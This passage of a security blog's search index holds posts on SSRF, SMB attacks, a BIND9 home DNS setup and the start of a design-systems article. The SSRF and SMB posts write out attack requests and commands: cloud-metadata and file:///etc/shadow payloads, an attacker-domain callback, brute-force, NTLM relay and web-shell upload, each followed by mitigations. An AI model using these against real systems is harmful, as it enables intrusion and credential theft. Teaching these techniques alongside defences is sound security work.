BurpSuite, so we can see the request made when querying the product stock:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=stockApi=http://internal-stock-api/check?productId=123\n</code></pre> <p>This request causes the client to receive the stock of the product indicated by the <code>productId</code>. However, an attacker could modify the request to the specified URL, such as:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n</code></pre> <p>By sending this request, if the <code>/admin</code> directory exists on the attacked machine and is processed without further validation, the attacker could gain access to the internal admin panel.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#exploitation-example-to-access-amazon-ec2-metadata","title":"Exploitation Example to Access Amazon EC2 Metadata","text":"<p>A common case of SSRF exploitation is when the attacker accesses internal metadata of an EC2 instance on AWS:</p> <p><pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://169.254.169.254/latest/meta-data/\n</code></pre> Accessing this API could reveal sensitive information like access keys, IAM roles, or other sensitive data.</p> <p>Specific countermeasures can be found in the AWS documentation.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#exploitation-example-to-read-local-files","title":"Exploitation Example to Read Local Files:","text":"<p>If the application allows the use of the file:// scheme, an attacker could attempt to read system files as follows:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=file:///etc/shadow\n</code></pre>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#blind-ssrf","title":"Blind SSRF","text":"<p>Blind SSRF attacks are more challenging since the server does not return the response directly to the attacker. In this type of attack, the attacker must infer the success of their intrusion through observable changes in application behavior or by interacting with an external server.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#exploitation-methodology_1","title":"Exploitation Methodology","text":"<p>Imagine a web application that allows users to upload profile pictures. The application verifies that the image is valid by making a request to the provided URL but does not display the result of this verification to the user.</p> <p>A rudimentary implementation might look like this:</p> <pre><code>import requests\ndef verify_image(url):\n  try:\n    response = requests.get(url, timeout=5)\n    if response.headers.get('content-type', '').startswith('image/'):\n      return True\n  except:\n    pass\n    return False\n\n  user_provided_url = \"https://example.com/image.jpg\"\n  if verify_image(user_provided_url):\n    print(\"Valid image\")\n  else:\n    print(\"Rejected URL\")\n</code></pre> <p>In this case, the server receives a URL, which in this case is <code>https://example.com/image.jpg</code>, and then makes an HTTP request to that URL to check if it contains an image. Finally, if the provided URL returns a resource with Content-Type: image/*, it will be considered valid.</p> <p>The problem lies in the fact that the server blindly trusts URLs provided by users, allowing arbitrary HTTP requests to be made.</p> <p>If an attacker supplies a URL they control or one that points to an internal resource of the server, such as <code>http://internal-server/sensitive-data</code>, the attacker will not directly see the server's response, but they can deduce whether the request was successful by observing certain behaviors:</p> <ul> <li>Response time: An internal resource that takes longer to respond might indicate that the server accessed the resource.</li> <li>Error messages: Differences in the errors returned by the server can confirm the existence of the resource.</li> </ul> <p>To check if the request is being made to the provided URL, out-of-band (OOB) techniques are used, such as monitoring DNS or HTTP requests to domains controlled by the attacker. For example, it could be the following URL <code>http://internal-server.sensitive-data.attacker-domain.com</code>. Here, <code>attacker-domain</code> is a domain controlled by the attacker. If the vulnerable server processes this URL, it will try to resolve the domain and make an HTTP request to it. This allows the attacker to detect the activity by monitoring their own DNS or web server. This functionality is integrated through the Collaborator in the professional version of BurpSuite.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#how-to-prevent-ssrf-attacks","title":"How to Prevent SSRF Attacks","text":"<p>As we have seen earlier, SSRF attacks are particularly dangerous as they facilitate the exploitation of internal resources. To protect against this type of vulnerability, it's crucial to implement a combination of robust security measures. Below are the most effective strategies:</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#strict-input-validation","title":"Strict Input Validation","text":"<p>To protect against an SSRF attack, we can use the following:</p> <ul> <li>Whitelists: We can allow the server to access specific, trusted URLs for the proper functioning of the application. Instead of allowing any URL, define a whitelist of domains and paths that the server is permitted to access. Any request that does not match this whitelist should be rejected. Example: <code>allowed = [\"api.example.com/products\", \"images.example.com\"]</code>.</li> <li>Blocking Internal Addresses: We can block requests to internal URLs to prevent access to internal server resources (e.g., <code>localhost</code> or any IP in the range <code>192.168.x.x</code>). Configure the server to reject any request to private IP addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and to <code>localhost</code> (127.0.0.1). This prevents unauthorized access to internal network resources, preventing an attacker from manipulating the server to access services or data that should be protected.</li> <li>Restrict Protocols: We can block protocols such as smb://, file://, and others. Limiting protocols to HTTP(S) reduces the attack surface, preventing the use of other potentially insecure protocols to access internal or external resources.</li> </ul>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#use-of-web-application-firewalls-wafs","title":"Use of Web Application Firewalls (WAFs)","text":"<p>We can configure a WAF with specific rules to help detect and block suspicious patterns related to SSRF. WAFs can act as an additional layer of defense by monitoring and filtering outgoing traffic from the server.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#network-segmentation","title":"Network Segmentation","text":"<p>We can divide the network into segments and limit access between them. For example, if the web server should not have direct access to the database because it uses an API, then the ability to send traffic directly to the database server should be restricted. Generally, the host should not be able to access more internal services than those strictly necessary for its operation, minimizing the attack surface. This approach should be adapted to the specific situation of each service.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#implement-monitoring","title":"Implement Monitoring","text":"<p>Although blind SSRF does not show responses directly to the attacker, out-of-band techniques leave traces that can help detect malicious attempts. To detect these techniques, it is crucial to configure monitoring for DNS requests made by application servers to identify unexpected requests to external domains.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#periodic-security-testing","title":"Periodic Security Testing","text":"<p>Conduct periodic security audits to protect your web applications against this and other threats.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/23-03-2025/#conclusion","title":"Conclusion","text":"<p>Preventing SSRF attacks requires a layered security approach, combining input validation, the use of WAFs, regular updates, network segmentation, and security testing. By implementing these measures, we can significantly reduce the risk of our infrastructure being compromised by this vulnerability. Remember, security is an ongoing process, and it is important to stay updated on the latest vulnerabilities and attack techniques.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","SSRF","Web Security","Vulnerabilities"]},{"location":"blog/posts/24-11-2024/","title":"SMB 101","text":"<p>SMB (Server Message Block) is a protocol used to share resources such as files, printers, and directories over a network. It uses a client-server architecture, where the server makes resources available, and multiple clients can access them. Although SMB3 introduces encryption to protect data, earlier versions like SMB1 transmit information in plain text, making it vulnerable to certain attacks.</p> <p>In this article, we will focus on basic concepts, key commands, and common attacks related to SMB, highlighting the use of tools like enum4linux for enumeration.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#theory","title":"Theory","text":"","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#ports-used-by-smb","title":"Ports Used by SMB","text":"<p>SMB primarily operates on the following ports:</p> <ul> <li>445/TCP: Used by modern SMB for direct connections without NetBIOS.</li> <li>139/TCP: Used by older versions relying on NetBIOS.</li> </ul>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#authentication-in-smb","title":"Authentication in SMB","text":"<p>SMB employs several authentication mechanisms:</p> <ul> <li>NTLM (LAN Manager): Vulnerable to relay and brute-force attacks.</li> <li>Kerberos: More secure, used in environments with Active Directory.</li> </ul>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#enumeration-with-smb","title":"Enumeration with SMB","text":"<p>Enumeration is the initial step to gather information about shared resources, users, and the SMB server configuration. Here are some common tools for this purpose:</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#enum4linux","title":"Enum4linux","text":"<p>Enum4linux is an enumeration tool specifically designed for SMB. It allows identifying shared resources, password policies, and users on Windows systems.</p> <p>Common Commands:</p> <pre><code>enum4linux &lt;IP&gt;\n</code></pre> <p>Specific Modes:</p> <ul> <li> <p>Enumerate users:   <pre><code>enum4linux -U &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumerate shared resources:   <pre><code>enum4linux -S &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumerate domain information:   <pre><code>enum4linux -n &lt;IP&gt;\n</code></pre></p> </li> </ul> <p>Typical Outputs:</p> <ul> <li>Available shared resources.</li> <li>System users.</li> <li>Password policies, such as expiration and minimum length.</li> </ul>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#smbclient","title":"SMBClient","text":"<p>SMBClient is a tool integrated into Linux systems for interacting directly with SMB resources.</p> <p>Example Usage:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\n</code></pre> <p>After connecting, you can list, download, and upload files with FTP-like commands:</p> <pre><code>ls      # List current directory (file management and navigation commands similar to Linux)\nget     # Download a file\nput     # Upload a file\n</code></pre> <p>Enumerating shared resources:</p> <pre><code>smbclient -L //&lt;IP&gt; -U &lt;username&gt;\n</code></pre>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#common-smb-attacks","title":"Common SMB Attacks","text":"","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#null-sessions","title":"Null Sessions","text":"<p>Null sessions occur when an SMB server allows connections without authentication, exposing information such as shared resources and users.</p> <p>Enumerating Null Sessions with smbclient:</p> <pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre> <p>Danger</p> <p>Attackers can use this information to plan more advanced attacks, such as brute-force password attacks.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#brute-force-and-password-spraying","title":"Brute Force and Password Spraying","text":"<p>SMB can be vulnerable to brute-force attacks if proper security measures are not implemented. Tools like Hydra and Medusa are common for this purpose.</p> <p>Hydra for SMB:</p> <pre><code>hydra -L users.txt -P passwords.txt smb://&lt;IP&gt;\n</code></pre> <p>NetExec:</p> <pre><code>nxc smb &lt;IP&gt; -u users.txt -p passwords.txt\n</code></pre> <p>Danger</p> <p>The attacker may gain unauthorized access to shared resources if valid credentials are cracked.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#ntlm-relay","title":"NTLM Relay","text":"<p>This attack intercepts and forwards NTLM authentications to impersonate the legitimate user. SMB servers with signing disabled are especially vulnerable.</p> <p>Using Responder:</p> <pre><code>responder -I &lt;network_interface&gt;\n</code></pre> <p>Tip</p> <p>In order to mitigate, enable SMB signing and use Kerberos authentication instead of NTLM.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#credential-sniffing","title":"Credential Sniffing","text":"<p>Older versions like SMB1 transmit credentials in plain text, allowing an attacker to capture credentials with tools like Wireshark.</p> <p>Wireshark Filter:</p> <pre><code>tcp.port == 445\n</code></pre> <p>Danger</p> <p>An attacker may use captured credentials to access the SMB server.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#file-upload-for-rce","title":"File Upload for RCE","text":"<p>If an SMB resource allows writing, an attacker may upload malicious files, such as web shells, to execute remote commands.</p> <p>Uploading with SMBClient:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\nput webshell.aspx\n</code></pre> <p>Danger</p> <p>This can compromise the server, allowing command execution or malware installation.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/24-11-2024/#defenses-against-smb-exploits","title":"Defenses Against SMB Exploits","text":"<ol> <li> <p>Disable SMB1: It is outdated and vulnerable. Replace it with SMB2 or SMB3:</p> <pre><code>Set-SmbServerConfiguration -EnableSMB1Protocol $false\n</code></pre> </li> <li> <p>Enable SMB Signing: To prevent NTLM relay attacks.</p> </li> <li>Restrict Permissions: Ensure shared resources are protected with strict permissions.</li> <li>SMB3 Encryption: SMB3 allows encrypting traffic, protecting against sniffing.</li> <li>Regular Monitoring: Use tools like Splunk or Wireshark to detect anomalous activity.</li> </ol> <p>In the next article of this series on SMB we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","SMB"]},{"location":"blog/posts/26-01-2025/","title":"Comprehensive Guide to DNS: Overview, Setup & Security","text":"<p>Understanding the DNS (Domain Name System) is essential for anyone interested in how the internet works. DNS plays a crucial role in translating human-friendly domain names into machine-readable IP addresses, ensuring seamless web navigation.</p> <p>This guide walks you through:</p> <ul> <li>The hierarchical structure of DNS and its key components.</li> <li>Types of DNS queries and how they function.</li> <li>DNS security concerns and protective measures such as DNSSEC.</li> <li>Setting up a local DNS server using BIND9 for improved performance, privacy, and content filtering.</li> </ul> <p>So, if you want to take your knowledge to the next level and discover how this hierarchical system ensures that every page you visit is just a click away, read on.</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#the-basics-what-does-a-dns-do","title":"The Basics: What Does a DNS Do?","text":"<p>When you enter a domain name into your browser, your computer doesn\u2019t understand that name directly. Instead, your device initiates a process called name resolution to find the corresponding IP address. DNS servers handle this resolution through a structured, hierarchical system.</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#the-hierarchy-of-dns-servers","title":"The Hierarchy of DNS Servers","text":"Hierarchy of DNS Servers for Google <p>The DNS operates as a distributed, hierarchical system. Each level in this hierarchy plays a specific role in translating domain names into IP addresses. Here\u2019s how it works:</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#recursive-resolver-your-dns-query-starts-here","title":"Recursive Resolver (Your DNS Query Starts Here)","text":"<ul> <li>When you type a URL in your browser, your device sends a request to a recursive resolver. This is usually provided by your Internet Service Provider (ISP) or a third-party service such as Google Public DNS or Cloudflare.</li> <li>The recursive resolver's job is to handle your query and fetch the correct IP address by contacting other DNS servers on your behalf.</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#root-dns-servers-the-starting-point","title":"Root DNS Servers (The Starting Point)","text":"<ul> <li>If the recursive resolver doesn\u2019t already have the IP address cached, it contacts one of the 13 root DNS servers distributed globally.</li> <li>These servers don\u2019t store specific domain-to-IP mappings but point to the next level in the hierarchy: Top-Level Domain (TLD) servers.</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#top-level-domain-tld-servers","title":"Top-Level Domain (TLD) Servers","text":"<ul> <li>TLD servers manage domains based on their suffix, such as <code>.com</code>, <code>.org</code>, or <code>.net</code>. For instance, if you\u2019re visiting <code>google.com</code>, the root server will direct your query to the <code>.com</code> TLD server.</li> <li>The TLD server then provides the address of the authoritative name server for the requested domain.</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#authoritative-name-server","title":"Authoritative Name Server","text":"<ul> <li>The authoritative name server is the final step in the chain. It holds the actual DNS records for the domain, including the IP address of the web server.</li> <li>For Google, if you\u2019re looking for <code>google.com</code>, the authoritative server will return its corresponding IP address (e.g., <code>8.8.8.8</code>).</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#returning-the-answer","title":"Returning the Answer","text":"<ul> <li>Once the recursive resolver gets the IP address from the authoritative server, it sends it back to your browser. Your browser can then use the IP address to connect to the website\u2019s server and load the page.</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#types-of-dns-queries","title":"Types of DNS Queries","text":"<p>During this process, there are three main types of DNS queries:</p> <ol> <li>Recursive Query: The resolver takes full responsibility for finding the IP address and returns it to the client.</li> <li>Iterative Query: The resolver queries each DNS server in sequence, receiving referrals to the next server until it finds the IP address.</li> <li>Non-Recursive Query: If the resolver already has the requested information cached, it immediately returns the result.</li> </ol>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#dns-records-the-building-blocks","title":"DNS Records: The Building Blocks","text":"<p>The authoritative name server stores different types of DNS records that contain specific information about a domain. Some of the most common records include:</p> <ul> <li>A Record: Maps a domain to an IPv4 address.</li> <li>AAAA Record: Maps a domain to an IPv6 address.</li> <li>CNAME Record: Points a domain to another domain (used for aliases).</li> <li>MX Record: Specifies mail servers for email delivery.</li> <li>TXT Record: Provides additional information about a domain, often used for verification.</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#dns-caching-speeding-things-up","title":"DNS Caching: Speeding Things Up","text":"<p>To improve performance and reduce the load on DNS servers, caching is used at various levels:</p> <ul> <li>Browser Cache: Your browser temporarily stores DNS responses for domains you visit frequently.</li> <li>Operating System Cache: Your device\u2019s operating system also caches DNS responses to avoid redundant queries.</li> <li>Resolver Cache: The recursive resolver keeps a cache of recently queried domains to speed up future lookups.</li> </ul> <p>Caching ensures that most DNS queries don\u2019t need to traverse the entire hierarchy, making internet browsing faster and more efficient.</p> <p>To observe how DNS caching reduces response times, let's use the dig command paying attention to the Query Time for google domain:</p> <p>In the first trial we got:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 25335\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             215     IN      A       142.250.200.142\n\n;; Query time: 68 msec\n</code></pre> <p>And in the second time, we got:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 44597\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             287     IN      A       142.250.200.78\n\n;; Query time: 36 msec\n</code></pre> <p>As we can see, the time has decreased.</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#dns-security","title":"DNS Security","text":"<p>Despite its importance, the DNS system has vulnerabilities that can be exploited by attackers. Some common issues include:</p> <ul> <li>DNS Spoofing/Poisoning: Malicious actors inject false DNS records into a cache, redirecting users to fraudulent websites.</li> <li>DDoS Attacks: This is one of the most well-known attacks consisting on flooding DNS servers with traffic to disrupt service.</li> <li>Man-in-the-Middle Attacks: Intercepting DNS queries to modify responses.</li> </ul> <p>To combat these threats, technologies like DNSSEC (Domain Name System Security Extensions) add cryptographic signatures to DNS records, ensuring their authenticity. Imagine you want to visit google.com:</p> <ol> <li>Your browser requests the IP address for google.com from a recursive resolver.</li> <li>The resolver checks the DNSSEC signatures at each level (root, .com, and google.com).</li> <li>If all signatures are valid, the resolver returns the IP address.</li> <li>If any signature fails, the resolver knows the data has been tampered with and discards it.</li> </ol>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#setup-a-local-dns-for-privacy-and-performance-purposes","title":"Setup a Local DNS for Privacy and Performance purposes","text":"<p>If you've made it this far, congratulations! You now understand the basics and key principles of DNS servers. With this knowledge, you're ready to roll up your sleeves and set up your own local DNS server. Doing so opens up a world of possibilities: you can filter unwanted content across your network, enhance browsing performance, and even navigate the internet more securely, minimizing the risk of viruses and other online threats.</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#bind9","title":"Bind9","text":"<p>In this article, we'll use the BIND9 DNS server to set up a DNS server directly on our computer. This hands-on approach will let us experience what it\u2019s like to have a fully functional DNS server running within our own network\u2014right from the comfort of our own machine!</p> <p>Let's first install bind9:</p> <pre><code>sudo apt update\nsudo apt install bind9 dnsutils\n</code></pre> <p>Configure your system to first ask the local DNS server that we have installed:</p> <pre><code>sudo nano /etc/resolv.conf\n</code></pre> <p>Add the local server as the first line.</p> <pre><code>nameserver 127.0.0.1\n</code></pre> <p>After that, we will edit the configuration file:</p> <pre><code>sudo nano /etc/bind/named.conf.options\n</code></pre> <p>Remove everything in that file and add the following:</p> <pre><code>acl \"trusted\" {\n    192.168.0.0/16;\n    localhost;\n};\n\noptions {\n    directory \"/var/cache/bind\";\n\n    recursion yes;\n    allow-query { trusted; };\n\n    forwarders {\n        1.1.1.3;\n        1.1.1.2;\n    };\n\n    dnssec-validation auto;\n\n    listen-on { any; };\n    listen-on-v6 { any; };\n};\n</code></pre> <p>This ACL specifies which clients are considered \"trusted\" and can interact with the DNS server.</p> <p>The options block contains global settings for the BIND9 server. Let\u2019s go through each line:</p> <ul> <li> <p><code>directory \"/var/cache/bind\";</code> This specifies the directory where BIND will store its cache and related files.</p> </li> <li> <p><code>recursion yes;</code> Enables recursive queries, meaning the server will resolve DNS queries on behalf of clients by querying other DNS servers if it doesn\u2019t have the answer cached or locally configured.</p> </li> <li> <p><code>allow-query { trusted; };</code> Restricts which clients can send queries to the server. Only clients defined in the trusted ACL (local network and localhost) are allowed to query this DNS server.</p> </li> <li> <p><code>forwarders { 1.1.1.3; 1.1.1.2; };</code> Defines external DNS servers (in this case, Cloudflare's filtered DNS servers) to which the server will forward queries it cannot resolve locally. The server acts as an intermediary, forwarding unresolved queries to these upstream servers.</p> <ul> <li>1.1.1.3: Blocks malicious content.</li> <li>1.1.1.2: Blocks malware-related content.</li> </ul> </li> <li> <p><code>dnssec-validation auto;</code> Enables DNSSEC validation automatically, ensuring the authenticity and integrity of DNS responses using cryptographic signatures.</p> </li> </ul> <p>With this configuration, we\u2019ve implemented basic security measures by trusting Cloudflare's DNS servers to handle forwarded queries, ensuring that responses are filtered to avoid malicious domains.</p> <p>We can check our performance improvement by doing the same as before, using the dig command to look for the Query Time of google.com domain.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56385\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: 2b2a789af74949000100000067966b06329ed55c149fd975 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             300     IN      A       142.250.200.142\n\n;; Query time: 67 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>After the second query, we achieve a 0ms response time, as our local DNS server efficiently retrieves the result from its cache.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51691\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: a2419e6c5e03859d0100000067966b096b0ad0c0a30e2273 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             297     IN      A       142.250.200.142\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>We can see that the SERVER we are asking is <code>127.0.0.1</code> as it is our bind9 DNS server.</p> <p>However, what if we want to take things a step further and enforce our own restrictions? Whether it\u2019s for enhanced security, blocking specific websites, or creating a safer internet environment for children, we can configure BIND9 to restrict access to a custom list of domains. This gives us full control over what content is allowed or denied on our network, tailoring the DNS server to meet our specific needs.</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#blocking-specific-domains-using-bind9","title":"Blocking specific domains using BIND9","text":"<p>To block specific domains using BIND9, you can create a custom zone file that redirects queries for those domains to an invalid or non-existent address, effectively blocking access.</p> <p>Here's a step-by-step guide:</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#create-a-zone-file-for-blocked-domains","title":"Create a Zone File for Blocked Domains","text":"<p>A zone file defines the DNS records for the domains you want to block. These records can redirect the blocked domains to a &lt;&lt;blackhole&gt;&gt; (e.g., <code>127.0.0.1</code> or <code>0.0.0.0</code>).</p> <ol> <li>Create a new zone file for blocking domains, for example, <code>block_instagram.zone</code>: <pre><code>sudo nano /etc/bind/block_instagram.zone\n</code></pre></li> <li>Add the following content to the zone file:</li> </ol> <pre><code>$TTL    3600\n@       IN      SOA     localhost. root.localhost. (\n                2025012601 ; Serial\n                3600       ; Refresh\n                1800       ; Retry\n                604800     ; Expire\n                86400 )    ; Minimum TTL\n        IN      NS      localhost.\n\n@       IN      A       127.0.0.1\n*       IN      A       127.0.0.1\n</code></pre> <ul> <li> <p>127.0.0.1: Redirects queries for the blocked domains to the local machine, effectively preventing access.</p> </li> <li> <p>Wildcard Record ( IN A)*: Ensures any subdomain of the blocked domain is also redirected.</p> </li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#define-the-blocked-domains-in-namedconflocal","title":"Define the Blocked Domains in <code>named.conf.local</code>","text":"<p>We are going to block Instagram. You need to associate the blocked domains with the custom zone file.</p> <ol> <li> <p>Open the BIND9 configuration file: <pre><code>sudo nano /etc/bind/named.conf.local\n</code></pre></p> </li> <li> <p>Add a zone entry for each domain you want to block. In this case we will block instagram.com and cdninstagram.com, Instagram's content delivery network (CDN) domain used for serving images and videos: <pre><code>zone \"instagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n\nzone \"cdninstagram.com\" {\n    type master;\n    file \"/etc/bind/block_instagram.zone\";\n};\n</code></pre></p> </li> </ol>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#reload-bind9-configuration","title":"Reload BIND9 Configuration","text":"<p>Once you\u2019ve created the zone file and updated the configuration, reload the BIND9 service to apply the changes.</p> <ol> <li> <p>Check the configuration for errors: <pre><code>sudo named-checkconf\n</code></pre></p> </li> <li> <p>Reload the BIND9 service: <pre><code>sudo systemctl reload bind9\n</code></pre></p> </li> </ol>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#test-the-configuration","title":"Test the Configuration","text":"<p>To verify that the blocked domains are working as expected:</p> <ol> <li> <p>Use the dig command to query the blocked domain: <pre><code>dig instagram.com.\n</code></pre></p> <ul> <li>The response should return 127.0.0.1.</li> </ul> </li> <li> <p>Try accessing the blocked domain in a browser. It should fail to load.</p> </li> </ol> Instagram not Available <p>By creating a custom zone file and associating it with the domains you want to block, you gain full control over restricting access to specific websites. This setup allows you to:</p> <ul> <li>Enhance security by blocking known malicious domains.</li> <li>Customize the DNS server to meet your network\u2019s specific requirements.</li> </ul>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/26-01-2025/#conclusion","title":"Conclusion","text":"<p>Now you\u2019ve learned how to block any domain you don\u2019t want your family or network users accessing. Whether it\u2019s limiting social media to help your kids focus, enhancing security by blocking malicious sites, or simply taking control of your network, you now have the tools to make it happen.</p> <p>This example was done on a local laptop, but it doesn\u2019t have to stop there. You can implement the same setup at the router level or use a Raspberry Pi as your primary DNS server. By doing this, you can apply these rules to your entire network, ensuring that all connected devices follow your custom restrictions.</p> <p>With this approach, you\u2019re not just managing a DNS server\u2014you\u2019re creating a safer, more productive digital environment for everyone on your network.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["DNS","Networking","Security","Performance","Home Lab","Server Administration"]},{"location":"blog/posts/27-04-2025/","title":"Design Systems: Creating Visual Consistency Across Products","text":"<p>Imagine you're working as a designer for a company, responsible for designing multiple microservices. The first one turns out great, however, when it comes to creating the second one, you notice that there isn't much coherence with the first and that although they look similar, there's something that doesn't make them appear to be from the same company. Different fonts, spacing, styles, colors, and iconography are used...</p> <p>Once the designs are completed, the client congratulates you, since they liked them, however, after some time they write to you, saying that while there has been an improvement compared to what they had before, the microservices weren't cohesive, there wasn't a correlation between them, and in short, they seemed 